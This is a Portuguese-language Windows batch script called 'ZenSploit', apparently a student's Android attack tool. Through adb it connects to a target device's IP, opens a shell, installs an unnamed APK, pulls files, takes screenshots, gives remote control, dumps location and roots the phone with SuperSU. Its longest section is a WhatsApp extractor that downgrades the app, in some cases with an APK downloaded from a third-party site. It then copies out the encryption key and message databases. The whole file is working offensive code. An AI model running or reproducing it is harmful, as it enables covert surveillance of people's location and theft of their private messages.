echo off 
cls
chcp 1252
cls
title ZenSploit - Ferramenta De Pentest Mobile
:menu
cd icone
type 1.txt
cd .. 
echo.
echo wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
echo w        ============ CONEXAO =============            W
echo w    1 - Conectar Ao Dispositivo                       w
echo w    2 - STATUS DE CONEXAO                             w
echo w    3 - DESCONECTAR DO DISPOSITIVO                    W
echo w                                                      w
echo w    ============= Ferramentas =================       w 
echo w                                                      w        
echo w    0 - NOME DO DISPOSITIVO                           w
echo w    4 - SHELL                                         w      
echo w    5 - Instalar App No Android                       w
echo w    6 - Baixar Arquivo                                w
echo w    7 - upload de Arquivo                             w
echo w    8 - TIRAR FOTO DO DISPOSITIVO                     w
echo w    9 - Conexao Remota do Dispositivo                 W
echo w    10 - SAIR DO PROGRAMA                             w
echo w    11 - Descobrir Localizacao Aproximada             w          
echo w    12 - Ver informacoes de rede                      w
echo w    13 - Listar Apks No Dispositivo                   w
echo w    14 - Exploit Root Android                         w
echo w    15 - EXTRA??O DA CHAVE DO WHATSAPP                w
echo wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
echo w                                                      w
echo w                                                      w
echo w          SCRIPT DESENVOLVIDO POR CYBER - BRUNO       W
echo w          ESTUDANTE DE SI - 28/08/2020                W
echo w                                                      w
echo w                                                      w
echo w                                                      w
echo w                                                      w
echo wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
echo.
ECHO.
echo.
SET /p op=SELECIONE A OPCAO # 
IF %op% equ 0 goto 0
IF %op% equ 1 goto 1
IF %op% equ 2 goto 2
if %op% equ 3 goto 3
if %op% equ 4 goto 4
if %op% equ 5 goto 5
if %op% equ 6 goto 6
if %op% equ 7 goto 7
IF %op% equ 8 goto 8
IF %op% equ 9 goto 9
if %op% equ 10 goto 10
if %op% equ 11 goto 11
if %op% equ 12 goto 12
if %op% equ 13 goto 13
if %op% equ 14 goto 14
if %op% equ 15 goto 15
:0
cls
echo ===============  VOCE SELECIONOU - A OPCAO 0 - Versao do Android ========
adb shell uname -a
pause
cls
goto menu
:1
cls 
echo ===============  VOCE SELECIONOU - A OPCAO 1 CONECTAR ========
SET /P IP=DIGITE O IP DO ALVO:
set hora_atual=%time:~0,2%
set min_atual=%time:~3,2%
set data=%date:~6,4%%date:~3,2%%date:~0,2%
echo %hora_atual%:%min_atual%
echo CONECTADO A=%IP% ========== DATA: %data%  ========== HORA: %hora_atual%:%min_atual% >> "logs\log.txt"
cls
echo CONECAO INICIADA COM SUCESSO.....100/100
echo.
adb connect %ip%:5555
pause
cls
goto menu
:2
cls
echo ===============  VOCE SELECIONOU - A OPCAO 2 STATUS ========
adb.exe devices -l
pause
cls
goto menu
:3
cls
echo ===============  VOCE SELECIONOU - A OPCAO 3 DESCONECTAR ========
adb disconnect
pause
cls
goto menu
:4
cls
echo ===============  VOCE SELECIONOU - A OPCAO 4 SHELL ========
pause
adb shell
pause
cls
goto menu
:5
cls
echo ===============  VOCE SELECIONOU - A OPCAO 5 Instalação de App ========
pause
cls 
echo =============== ESTAMOS INSTALANDO O APK NO DISPOSITIVO
adb install app\cliente.apk
echo.
echo Comando Executado com Exito.....
pause
cls

pause
cls
goto menu
:6
cls
echo.
echo ===============  VOCE SELECIONOU - A OPCAO 6 BAIXAR ARQUIVO ========
echo.
echo.
echo ====================== PRESSIONE ENTER PARA CONTINUAR ====================
pause
cls
SET /p diretorioandroid=SELECIONE O DIRETORIO DO ARQUIVO ANDROID EX: /sdcard/nome.txt ==: 
SET /p diretoriocomputador= SELECIONE O DIRETORIO ONDE DESEJA EFETUAR O DOWNLOAD EX: C:\Users\bruno\Desktop\nome.txt ==: 
pause
cls
echo.
echo MUITO BEM ESTAMOS EFETUANDO O DOWNLOAD  
adb pull %diretorioandroid% %diretoriocomputador%
echo.
echo.
echo == ARQUIVO BAIXADO COM SUCESSO ==
echo DESEJA VISUALIZAR O ARQUIVO BAIXADO?
echo.
echo 1- SIM  =============== 2 - NAO
echo.
echo.
echo.
set /p visualizar2=SELECIONE UMA OPCAO: 
if %visualizar2% equ 1 goto visualizar2
if %visualizar2% equ 2 goto voltar2
:visualizar2
cls
echo ESTAMOS ABRINDO O SEU ARQUIVO!!!
pause
start %diretoriocomputador%
cls
goto menu
:voltar2
cls 
goto menu
:7
:8
cls
echo ===============  VOCE SELECIONOU - A OPCAO 8 CAPTURE SCREEN ========
echo.
echo.
echo ====================== PRESSIONE ENTER PARA CONTINUAR ====================
pause
cls
SET /p diretorio=SELECIONE O DIRETORIO QUE QUER BAIXAR A IMAGEM EX: C:\Users\bruno\Desktop ======: 
echo.
echo.
echo O DIRETORIO ESCOLHIDO FOI %diretorio%
echo.
echo ESTAMOS BAIXANDO A FOTO DO DISPOSITIVO EM SEU DIRETORIO
pause
cls
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png "%diretorio%"
echo.
echo.
echo IMAGEM BAIXADA COM SUCESSO
echo DESEJA VISUALIZAR A IMAGEM BAIXADA?
echo.
echo 1- SIM  =============== 2 - NAO
echo.
echo.
set /p visualizar=SELECIONE UMA OPCAO: 
if %visualizar% equ 1 goto visualizar
if %visualizar% equ 2 goto voltar
:visualizar
cls
echo ESTAMOS ABRINDO A SUA IMAGEM!!!
pause
start %diretorio%/screen.png
cls
goto menu
:voltar
cls 
goto menu 
:9
cls
echo ===============  VOCE SELECIONOU - A OPCAO 9 ACESSO REMOTO ========
ECHO VOCE SERA CONECTADO EM BREVE AO DISPOSITIVO
pause
scrcpy.exe
pause
cls 
goto menu
:10
cls
echo OBRIGADO POR EXECUTAR O SCRIPT PRESSIONE ENTER PARA SAIR
pause
exit
:11
cls
echo ===============  VOCE SELECIONOU - A OPCAO 11 DESCOBRIR A LOCALIZACAO APROXIMADA ========
echo.
echo.
echo PRESSIONE ENTER PARA CONTINUAR............
pause
cls
adb shell dumpsys location
echo.
echo.
pause
cls
goto menu
:12
cls
echo ===============  VOCE SELECIONOU - A OPCAO 12 INFORMACOES DE REDE ========
echo.
echo.
echo PRESSIONE ENTER PARA CONTINUAR............
pause
cls
adb shell ifconfig 
echo.
echo.
pause
cls
goto menu
:13
cls
echo ===============  VOCE SELECIONOU - A OPCAO 13 LISTAR APKS ========
echo.
echo.
echo PRESSIONE ENTER PARA CONTINUAR............
pause
cls
adb shell pm list packages -f 
echo.
echo.
pause
cls
goto menu


:14
cls
echo ================ Voce Selecionou Root - Op??o 14 ====
echo.
echo.         O Dispositivo Ser? Roteador.....
echo.
cd root
adb wait-for-device
adb shell mount -o rw,remount /system
adb shell mount -o rw,remount rootfs /
adb push SuperSU-v2.74-2.img /data/su.img
adb push launch_daemonsu.sh /system/etc/launch_daemonsu.sh
adb install -r SuperSU-v2.74-2.apk
adb shell < supersu.cmds
cd ..
cls
echo.
echo. 
echo Dispositivo Roteado Com Sucesso, Ser? Reiniciado Dentre Estantes...
echo Aperte Qualquer Tecla Para Proseguir!
echo. 
pause >> null
goto menu


:15
cls
title Extra??o Key Whatsapp
echo.
echo.     Voce Selecionou a Op??o 15 - Extra??o da Key Do Whatsapp...
echo      Depencias Da Ferramenta: Tenha o Java Instalado Em Seu Pc!
echo      Confirme "Enter Para Continuar...."
echo.
pause >> null
cls
echo 
echo.
echo. 
cd Key_Whatsapp
SETLOCAL ENABLEDELAYEDEXPANSION
color 0a
title WhatsApp Key/DB Extractor 4.7 (Official)
echo.
echo ============================================================================================
echo = Este script extrair? o arquivo de chave e o banco de dados do WhatsApp no ??Android 4.0+   =
echo = Voc? N?O precisa de raiz para que isso funcione, mas precisa do Java instalado.          =
echo = Se sua vers?o do WhatsApp for maior que 2.11.431 (provavelmente), ent?o                  =
echo = uma vers?o herdada ser? instalada temporariamente para obter backup                      =
echo = Voc? N?O perder? nenhum dado e sua vers?o atual ser? ser restaurado no final do          =
echo = processo de extra??o, portanto, tente n?o entrar em p?nico                               =
echo = Agradecemos a: dragomerlin pela ABE e a Abinash Bishoyi por ser legal.                   =
echo ============================================================================================
echo.
if not exist bin (
echo Diretorio Bin Nao Encontrado, Verifique Se vc Extraiu corretamente a Ferramenta com a estrutura de Diretorios... 
echo.
echo Exiting ...
echo.
bin\adb.exe kill-server
pause
Cls 
cd ..
goto menu
)
echo  conecte seu dispositivo Android com a Depura??o USB ativada:
echo.
bin\adb.exe kill-server
bin\adb.exe start-server
bin\adb.exe wait-for-device
bin\adb.exe shell getprop ro.build.version.sdk > tmp\sdkver.txt
set /p sdkver=<tmp\sdkver.txt
echo.
if %sdkver% leq 13 (
set sdkver=
echo Vers?o Android n?o suportada - esse m?todo funciona apenas em 4.0 ou superior: /
echo.
echo Limpando arquivos tempor?rios ...
del tmp\sdkver.txt /s /q
echo.
echo Exiting ...
echo.
bin\adb.exe kill-server
pause
cls
cd ..
goto menu
)
bin\adb.exe shell pm path com.whatsapp | bin\grep.exe package > tmp\wapath.txt
bin\adb.exe shell "echo $EXTERNAL_STORAGE" > tmp\sdpath.txt
bin\adb.exe shell dumpsys package com.whatsapp | bin\grep.exe versionName > tmp\wapver.txt
bin\curl.exe -sI http://www.cdn.whatsapp.net/android/2.11.431/WhatsApp.apk | bin\grep.exe Content-Length > tmp\waplen.txt
set /p apkflen=<tmp\waplen.txt
set apkflen=%apkflen:Content-Length: =%
if %apkflen% == 18329558 (
set apkfurl=http://www.cdn.whatsapp.net/android/2.11.431/WhatsApp.apk
) else (
set apkfurl=http://whatcrypt.com/WhatsApp-2.11.431.apk
)
set /p apkpath=<tmp\wapath.txt
set /p sdpath=<tmp\sdpath.txt
set apkpath=%apkpath:package:=%
set /p version=<tmp\wapver.txt
for %%A in ("%apkpath%") do (
set apkname=%%~nxA
)
:nextVar
for /F "tokens=1" %%k in ("%version%") do (
set %%k
set version=%%v
)
for %%A in (wapath.txt) do if %%~zA==0 (
set apkpath=
echo.
echo WhatsApp is not installed on the target device
echo.
echo Exiting ...
echo.
) else (
echo WhatsApp %versionName% installed
echo.
if %versionName% gtr 2.11.431 (
if not exist tmp\LegacyWhatsApp.apk (
echo Downloading legacy WhatsApp 2.11.431 to local folder
bin\curl.exe -o tmp\LegacyWhatsApp.apk %apkfurl%
) else (
echo Found legacy WhatsApp 2.11.431 in local folder
)
echo.
if %sdkver% geq 11 (
bin\adb.exe shell am force-stop com.whatsapp
) else (
bin\adb.exe shell am kill com.whatsapp
)
echo Backing up WhatsApp %versionName%
bin\adb.exe pull %apkpath% tmp
echo Backup complete
echo.
if %sdkver% geq 23 (
echo Removing WhatsApp %versionName% skipping data
bin\adb.exe shell pm uninstall -k com.whatsapp
echo Removal complete
echo.
)
echo Installing legacy WhatsApp 2.11.431
if %sdkver% geq 17 (
bin\adb.exe install -r -d tmp\LegacyWhatsApp.apk
) else (
bin\adb.exe install -r tmp\LegacyWhatsApp.apk
)
echo Install complete
echo.
if %sdkver% geq 23 (
bin\adb.exe backup -f tmp\whatsapp.ab com.whatsapp
) else (
bin\adb.exe backup -f tmp\whatsapp.ab -noapk com.whatsapp
)
if exist tmp\whatsapp.ab (
echo.
set /p password="Digite sua senha de backup (deixe em branco para nenhuma) e pressione Enter: "
echo.
if "!password!" == "" (
java -jar bin\abe.jar unpack tmp\whatsapp.ab tmp\whatsapp.tar
) else (
java -jar bin\abe.jar unpack tmp\whatsapp.ab tmp\whatsapp.tar "!password!"
)
bin\tar.exe xvf tmp\whatsapp.tar -C tmp\ apps/com.whatsapp/f/key
bin\tar.exe xvf tmp\whatsapp.tar -C tmp\ apps/com.whatsapp/db/msgstore.db
bin\tar.exe xvf tmp\whatsapp.tar -C tmp\ apps/com.whatsapp/db/wa.db
bin\tar.exe xvf tmp\whatsapp.tar -C tmp\ apps/com.whatsapp/db/axolotl.db
bin\tar.exe xvf tmp\whatsapp.tar -C tmp\ apps/com.whatsapp/db/chatsettings.db
echo.
if exist tmp\apps\com.whatsapp\f\key (
echo Extracting whatsapp.cryptkey ...
copy tmp\apps\com.whatsapp\f\key extracted\whatsapp.cryptkey
echo.
)
if exist tmp\apps\com.whatsapp\db\msgstore.db (
echo Extracting msgstore.db ...
copy tmp\apps\com.whatsapp\db\msgstore.db extracted\msgstore.db
echo.
)
if exist tmp\apps\com.whatsapp\db\wa.db (
echo Extracting wa.db ...
copy tmp\apps\com.whatsapp\db\wa.db extracted\wa.db
echo.
)
if exist tmp\apps\com.whatsapp\db\axolotl.db (
echo Extracting axolotl.db ...
copy tmp\apps\com.whatsapp\db\axolotl.db extracted\axolotl.db
echo.
)
if exist tmp\apps\com.whatsapp\db\chatsettings.db (
echo Extracting chatsettings.db ...
copy tmp\apps\com.whatsapp\db\chatsettings.db extracted\chatsettings.db
echo.
)
if exist tmp\apps\com.whatsapp\f\key (
echo Pushing cipher key to: %sdpath%/WhatsApp/Databases/.nomedia
bin\adb.exe push tmp\apps\com.whatsapp\f\key %sdpath%/WhatsApp/Databases/.nomedia
echo.
)
echo Cleaning up temporary files ...
echo.
if exist tmp\whatsapp.ab (
del tmp\whatsapp.ab /s /q
)
if exist tmp\whatsapp.tar (
del tmp\whatsapp.tar /s /q
)
if exist tmp\waplen.txt (
del tmp\waplen.txt /s /q
)
if exist tmp\sdpath.txt (
del tmp\sdpath.txt /s /q
)
if exist tmp\wapath.txt (
del tmp\wapath.txt /s /q
)
if exist tmp\wapver.txt (
del tmp\wapver.txt /s /q
)
if exist tmp\sdkver.txt (
del tmp\sdkver.txt /s /q
)
if exist tmp\apps (
rmdir tmp\apps /s /q
)
echo.
echo Done
echo.
) else (
echo Operation failed
)
if not exist tmp\%apkname% (
echo Downloading WhatsApp %versionName% to local folder
bin\curl.exe -o tmp\%apkname% http://www.cdn.whatsapp.net/android/%versionName%/WhatsApp.apk
)
if exist tmp\%apkname% (
echo Restoring WhatsApp %versionName%
if %sdkver% geq 17 (
bin\adb.exe install -r -d tmp\%apkname%
) else (
bin\adb.exe install -r tmp\%apkname%
)
echo.
echo Restore complete
echo.
echo Removing WhatsApp %versionName% temporary apk
del tmp\%apkname% /s /q
)
) else (
echo Operation failed
)
)
)
set sdkver=
set apkpath=
set sdpath=
set apkname=
set apkflen=
set apkfurl=
set version=
set versInfo=
set versionName=
set password=
echo.
echo Operation complete
echo.
bin\adb.exe kill-server
echo Aperte Enter Para Proseguir....
pause >> null 
cls
cd ..
goto menu








